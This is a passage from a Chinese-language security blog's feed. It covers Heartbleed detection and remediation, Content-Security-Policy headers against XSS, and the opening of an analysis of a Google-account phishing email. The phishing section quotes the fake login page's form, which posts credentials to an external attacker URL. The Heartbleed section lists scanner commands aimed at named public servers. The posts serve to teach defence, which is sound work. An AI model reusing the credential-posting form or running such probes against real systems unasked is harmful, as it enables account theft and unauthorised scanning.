&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl -R &amp;#39;Cookie:.*&amp;#39; www.broken-site.com:443&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check webserver via proxy&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls http:www.google.com:443 proxy:8000&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check imap server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls imap imap.gmx.net:143&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check pop server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls pop pop.gmx.net:110&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check smtp server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls smtp smtp.gmail.com:587&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;section-1&quot;&gt;應對措施&lt;/h3&gt;

&lt;p&gt;如果發現自己的伺服器有這樣的漏洞，該怎麼辦呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;確認自己的 OpenSSL 版本是否在受害範圍&lt;/li&gt;
  &lt;li&gt;使用 ssltest.py 檢測工具檢測是否含有漏洞&lt;/li&gt;
  &lt;li&gt;更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;重開所有與 OpenSSL 函式庫相關之服務&lt;/li&gt;
  &lt;li&gt;重新產生 SSL Private Key (因為 Private Key 可能藉由漏洞外洩)&lt;/li&gt;
  &lt;li&gt;將網站舊憑證撤銷&lt;/li&gt;
  &lt;li&gt;清除所有目前網頁伺服器上的 Session （因為可能遭到竊取）&lt;/li&gt;
  &lt;li&gt;必要時更換網站內使用者密碼，或是密切追蹤網站是否有帳號盜用的情況發生&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;詳細討論與建議可以參考
Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&quot;&gt;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;誰會是目標呢？&lt;/h3&gt;

&lt;p&gt;真的會有攻擊者利用這樣的攻擊手法嗎？目前在&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲 wooyun&lt;/a&gt;平台上已經滿滿的資安研究員開始回報網站含有 OpenSSL 漏洞。也有駭客在嘗試撰寫更有效的攻擊利用程式，想要藉此把平常打不下來的網站一舉攻陷。&lt;/p&gt;

&lt;p&gt;怎樣的站台會是重點目標呢？含有會員機制的網站特別如此，例如 Web Mail、社群網站等等。因此不少企業要多注意了，例如全世界最大的社群網站 Facebook、SlideShare、台灣知名電信公司網站、社交平台、網路銀行、NAS，都會在這波的攻擊範圍之內。如果沒有儘速修復，等到更有效的攻擊程式出現，就真的等著失血了。&lt;/p&gt;

&lt;h3 id=&quot;section-3&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;就連 OpenSSL 這種歷史悠久而且重要的函式庫，都可能犯這種基本的 C 語言程式設計錯誤，老舊的程式碼一定有不少陳年遺毒，如果沒有徹底清查，類似的心臟噴血事件會不斷上演。大家快點止血吧！ &lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Content-Security-Policy - HTTP Headers 的資安議題 (2)</title>
   <link href="http://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/"/>
   <updated>2014-04-08T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy</id>
   <content type="html">
&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;

&lt;p&gt;還記得在上一篇 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers 的資安議題 (1)&lt;/a&gt; 文章中，我們提到了多種資安相關的 HTTP headers 嗎？接下來的幾篇文章我們會介紹幾個專門對付 XSS 的 HTTP headers，首先就由 Content-Security-Policy 打頭陣。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;（以下簡稱 CSP）是從 2010 年被提出來的一項 Web 規格，主要目的是用來防止 Cross-Site Scripting（以下簡稱 XSS）跟網頁樣式置換（例如&lt;a href=&quot;http://udn.com/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;科技部被惡搞&lt;/a&gt;就是一個最好的例子）。經過五年發展，CSP 1.0 已從 W3C 的 TR (Technical Report) 變成 &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;，應該不久就會將成為 W3C 推薦標準。新的 &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; 則仍在草案階段。&lt;/p&gt;

&lt;p&gt;CSP 家族龐大，總共有三個類別，六個項目：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP-Report-Only&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在 CSP 發展初期，主流瀏覽器並未全部依照同一標準來開發，因此發展成這三種類別。目前由於 CSP 1.0 即將成為標準，大多數瀏覽器已支援 Content-Security-Policy 這個類別，因此狀況已逐漸收斂。主流瀏覽器的支援列表如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-qJvtcG9lvq8/Ux6DrOeqNhI/AAAAAAAAALQ/gzQ2EbNrOHA/w531-h105-no/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-qJvtcG9lvq8/Ux6DrOeqNhI/AAAAAAAAALQ/gzQ2EbNrOHA/w531-h105-no/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy 瀏覽器支援列表&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從列表中可看到，只要使用 Content-Security-Policy 與 X-Content-Security-Policy 就已有很高的覆蓋率，除非要支援 Safari 6，否則不用特意使用 X-WebKit-CSP。更詳細的瀏覽器支援列表可參考 &lt;a href=&quot;http://caniuse.com/contentsecuritypolicy&quot;&gt;Can I use&lt;/a&gt;。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;csp-10-&quot;&gt;CSP 1.0 主要作用&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;載入來源白名單&lt;/p&gt;

    &lt;p&gt;宣告一組受信任的白名單與資源種類（如 JavaScript, CSS, image 等等），使瀏覽器只能從此白名單中載入資源，藉此防止攻擊者從外部引入含有惡意程式碼的資源。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘self’ http://js.devco.re; style-src ‘self’ http://css.devco.re; img-src ‘self’ data:; frame-src ‘none’&lt;/p&gt;

    &lt;p&gt;效果：限定 script 資源只能從 http://js.devco.re 載入；限定 style 資源只能從 http://css.devco.re 載入；限定 img 只能從相同 domain 載入，並且支援 data scheme；限定 frame 不能從任何來源載入；除了 script、style、img、frame 之外的資源，則只能從同樣 domain 以及同樣協定的來源載入。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;禁止 inline 程式碼&lt;/p&gt;

    &lt;p&gt;一般人開發網站時為求便利，經常會在 HTML 中寫入一些 inline 程式碼，但攻擊者意圖入侵網站時也常用此手法。然而瀏覽器其實無法分辨這些 inline 程式碼究竟是開發人員寫的，還是攻擊者植入的。因此 CSP 乾脆強迫開發者必須把所有 inline 程式碼移到外部檔案，完全杜絕在 HTML 中出現 inline 程式碼的狀況。因此除非你在 CSP 宣告時有註明 ‘unsafe-inline’，否則 CSP 預設禁止使用 inline script 或 inline CSS。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘unsafe-inline’&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;禁止 eval 函式&lt;/p&gt;

    &lt;p&gt;eval() 對許多開發者來說一直是個非常方便的函式，然而若缺乏資安觀念，使用此函式時很可能會導致潛在的 XSS 風險。因此除非你在 CSP 宣告時有註明 ‘unsafe-eval’，否則 CSP 預設禁止使用 eval() 函式。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src ‘self’; script-src ‘unsafe-eval’&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;防止 sniffer&lt;/p&gt;

    &lt;p&gt;由於 CSP 可指定載入資源時強制使用 https 協定，因此可降低被 sniffing 的機率。&lt;/p&gt;

    &lt;p&gt;例：Content-Security-Policy: default-src http://devco.re; img-src https:&lt;/p&gt;

    &lt;p&gt;效果：限定圖片只能從 https 協定載入，不限定 domain。而除了圖片之外的資源則可從任意來源載入。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;csp-demo&quot;&gt;CSP Demo&lt;/h3&gt;

&lt;p&gt;下面這一段程式碼，使用 default-src * 讓相關資源可正常顯示：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy: default-src *&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;title&amp;gt;CSP Demo Site&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;h3&amp;gt;Content Security Policy Demo Site&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;img width=&amp;quot;200&amp;quot; height=&amp;quot;200&amp;quot; src=&amp;quot;http://devco.re/assets/themes/devcore/images/double-sticker.png&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;lt;iframe frameborder=&amp;#39;0&amp;#39; width=&amp;#39;300&amp;#39; height=&amp;#39;200&amp;#39; src=&amp;#39;http://www.youtube.com/embed/E-BGf1MwecU&amp;#39;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-DVXEu8Xe4GQ/Ux6DqiVHyBI/AAAAAAAAALU/88qSfa5aJkY/w754-h633-no/csp-demo-1.png&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-DVXEu8Xe4GQ/Ux6DqiVHyBI/AAAAAAAAALU/88qSfa5aJkY/w754-h633-no/csp-demo-1.png&quot; alt=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接下來我們將 php header 的那一行程式碼修改如下並且 reload 瀏覽器頁面：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-iisyWwpo5IY/Ux6Dqn3FBgI/AAAAAAAAALM/MahpofJ2sK0/w754-h633-no/csp-demo-2.png&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-iisyWwpo5IY/Ux6Dqn3FBgI/AAAAAAAAALM/MahpofJ2sK0/w754-h633-no/csp-demo-2.png&quot; alt=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;使用 CSP 限制 img 與 frame 的來源種類後，我們可以從上圖 Chrome Inspector 的紅字觀察到，網站的圖片與 iframe 影片已被瀏覽器擋掉，無法載入。&lt;/p&gt;

&lt;p&gt;如果擔心直接使用 CSP 會影響網站營運，但又想嘗試 CSP，可以先使用 Content-Security-Policy-Report-Only，示範如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy-Report-Only: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;; report-uri http://devco.re/demo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-zLXj9r2aIxc/UyGO-Bzi_5I/AAAAAAAAANU/nbwz6lAfTLc/w754-h594-no/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-zLXj9r2aIxc/UyGO-Bzi_5I/AAAAAAAAANU/nbwz6lAfTLc/w754-h594-no/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由上圖可以看到，此 header 不會直接阻擋不符合 CSP 規範的資源，但是會根據使用者所違反的規則發送相對應的 POST request 至指定的 URI，發送內容如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;quot;csp-report&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;blocked-uri&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://devco.re/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;document-uri&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://yoursite.com/csp.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;original-policy&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;; report-uri http://devco.re/demo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;referrer&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;status-code&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;quot;violated-directive&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;img-src https:&amp;quot;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;由發送內容可看出這個 request 因為違反了「img-src https:」規則而將「http://devco.re/」這個來源擋掉。經由此方式，可一邊修改網站一邊觀察是否仍有不符合 CSP 規範之處，等到所有違規的內容都修正完畢後，再將 CSP 套用到正式上線環境。&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;由於宣告方式非常多種，在這邊就不一一條列，若有興趣可前往 &lt;a href=&quot;http://content-security-policy.com/&quot;&gt;Content Security Policy Reference &amp;amp; Examples&lt;/a&gt;、[Using Content Security Policy - Security&lt;/td&gt;
      &lt;td&gt;MDN](https://developer.mozilla.org/en-US/docs/Security/CSP/Using_Content_Security_Policy) 等網頁，有更完整的使用情境與範例可供參考。另外也有 &lt;a href=&quot;http://benvinegar.github.io/csp-talk-2013/&quot;&gt;Slide&lt;/a&gt; (by Ben Vinegar) 跟 &lt;a href=&quot;https://www.youtube.com/watch?v=pocsv39pNXA&quot;&gt;YouTube 影片&lt;/a&gt; (by Adam Barth) 可參考。&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;若欲使用 CSP 卻一直未能成功時，可到 &lt;a href=&quot;http://www.cspplayground.com/csp_validator&quot;&gt;Content Security Policy Playground&lt;/a&gt; 驗證您所寫的設定是否正確。&lt;/p&gt;

&lt;h3 id=&quot;csp-&quot;&gt;CSP 實際使用案例&lt;/h3&gt;

&lt;p&gt;目前採用 CSP 的案例較少，比較知名的使用案例是 &lt;a href=&quot;https://github.com/&quot;&gt;GitHub&lt;/a&gt;，在 2013 年 4 月 &lt;a href=&quot;https://github.com/blog/1477-content-security-policy&quot;&gt;GitHub 還寫了一篇專文&lt;/a&gt;公告表示他們已開始採用 CSP。另外一個案例廠商可能較廣為人知，是在 2013 年當紅的免費儲存空間 &lt;a href=&quot;https://mega.co.nz/&quot;&gt;MEGA&lt;/a&gt;。兩個案例的實際內容可見於下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-WPU1UT9T6WA/Ux6DrfiQ_EI/AAAAAAAAALc/s0XmlPFKmoc/w1169-h758-no/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-WPU1UT9T6WA/Ux6DrfiQ_EI/AAAAAAAAALc/s0XmlPFKmoc/w1169-h758-no/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一項知名使用案例是 Google 明定&lt;a href=&quot;http://developer.chrome.com/extensions/contentSecurityPolicy&quot;&gt;開發 Chrome Extension 時必須使用 CSP&lt;/a&gt;，以追求更高的安全性。Mozilla 也在 &lt;a href=&quot;https://wiki.mozilla.org/Security/CSP/Specification&quot;&gt;MozillaWiki 開了一頁&lt;/a&gt;存放相關技術細節。若您想觀察其他使用案例，可使用 Chrome Inspector 或 curl 觀察以下幾個網站：&lt;a href=&quot;https://lastpass.com/&quot;&gt;LastPass&lt;/a&gt;，&lt;a href=&quot;https://support.twitter.com/&quot;&gt;Twitter Help Center&lt;/a&gt;，&lt;a href=&quot;https://adblockplus.org/en/chrome&quot;&gt;Adblock Plus&lt;/a&gt;，&lt;a href=&quot;https://www.sendsafely.com/&quot;&gt;Sendsafely&lt;/a&gt;，&lt;a href=&quot;http://likealyzer.com/&quot;&gt;LikeAlyzer&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;csp--1&quot;&gt;CSP 常見誤用案例&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;directives 後面不需加冒號&lt;/p&gt;

    &lt;p&gt;錯誤：default-src: ‘self’&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;directives 之間以分號區隔&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’, script-src ‘self’&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; script-src ‘self’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;多個 source 之間僅以空白區隔&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’; img-src ‘self’, img1.devco.re, img2.devco.re&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; img-src ‘self’ img1.devco.re img2.devco.re&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某些 source 必須加冒號（https:、data:）&lt;/p&gt;

    &lt;p&gt;錯誤：default-src ‘self’; img-src ‘self’ https data&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;default-src ‘self’; img-src ‘self’ https: data:&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;某些 source 必須用單引號括起來（’none’、’self’、’unsafe-inline’、’unsafe-eval’）&lt;/p&gt;

    &lt;p&gt;錯誤：script-src self unsafe-inline unsafe-eval&lt;/p&gt;

    &lt;p&gt;正確：&lt;strong&gt;script-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;使用 CSP 可以有效提升攻擊難度，讓許多常見的 XSS 攻擊失效，是一個非常推薦開發者使用的 HTTP header。但由於目前的開發者在 HTML 裡面寫 inline script 及 inline CSS 的比例非常高，同時也有一些網路服務預設都需要使用 inline script（例如 Google Analytics，相關解法可參考&lt;a href=&quot;http://stackoverflow.com/questions/3870345/new-google-analytics-code-into-external-file&quot;&gt;這裡&lt;/a&gt;），因此要享受這樣的安全之前，可能需要先付出許多時間與心力將網站大幅整理，套用 CSP 規範後網頁才能正常運作。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Google 帳號釣魚案例</title>
   <link href="http://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam/"/>
   <updated>2014-03-31T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</id>
   <content type="html">
&lt;p&gt;最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-GpAMTR_IrK0/UzlQhywLcII/AAAAAAAAAO8/LgV3z4knQc4/w788-h26-no/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-4JfiexvrRVs/UzlQh7GiRPI/AAAAAAAAAOw/uGaBU031GnA/w1024-h649-no/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail 國家資助的攻擊者警告&quot; title=&quot;Gmail 國家資助的攻擊者警告&quot; /&gt;&lt;/p&gt;

&lt;p&gt;駭客間的戰爭已經不只是個人對個人，而已經擴大成國家對國家。一個國家為了獲取他國的機密文件、情報、個人資料等，都會想盡各種辦法入侵帳號、寄送惡意郵件、釣魚盜取密碼等。而身為受害者的我們能做什麼呢？Google 官方提出的建議是：加強密碼安全、注意登入 IP 位址、更新自己使用的軟體、&lt;a href=&quot;https://support.google.com/accounts/answer/180744?hl=zh-Hant&quot;&gt;開啟二階段驗證&lt;/a&gt;。當然有良好的資安意識才是更重要的。&lt;/p&gt;

&lt;p&gt;正好今天收到一個簡單的案例，提供給各位參考。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;在信箱中躺著一封很像是國外客戶的信件「Company Profile / Order Details」。內容看起來也很正常，並且附上了公司的基本資料為附加檔案。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-BczI2MA-WFw/UzlQihSF0bI/AAAAAAAAAO0/qkzfK9xXoZ8/w708-h548-no/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;釣魚信件&quot; title=&quot;釣魚信件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;點開附件，會發現畫面先跳了 JavaScript 警告視窗後，隨即導向到 Google 登入頁面。&lt;/p&gt;

&lt;p&gt;注意看，這個登入頁面是真的嗎？有沒有發現畫面上的「Stay signed in」前面的勾變成方框了？瀏覽器上的網址也是在本機的位址。想想看，怎麼可能點了附件之後，跳轉到 Google 登入畫面？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-a_-JazlxC0o/UzlQiscnjDI/AAAAAAAAAPE/i9vS3hd5m_I/w897-h678-no/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;釣魚信件附件假冒 Google 登入&quot; title=&quot;釣魚信件附件假冒 Google 登入&quot; /&gt;&lt;/p&gt;

&lt;p&gt;讓我們看一下原始碼，會發現他的 form 被改成一個奇怪的網址，看起來就是惡意網站。其餘網頁的部份都是從 Google 真實的登入頁面抓取下來修改的。因此只要一不注意，就會以為是真的 Google 登入畫面而輸入帳號密碼。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-zI1dvdo-yQk/UzlQjVfs2gI/AAAAAAAAAPI/F4Lv_G43Tgo/w1280/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-zI1dvdo-yQk/UzlQjVfs2gI/AAAAAAAAAPI/F4Lv_G43Tgo/w850-h678-no/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;釣魚信件原始碼&quot; title=&quot;釣魚信件原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;節錄部分 code 如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;novalidate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://cantonfair.a78.org/yahoo/post.php&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span 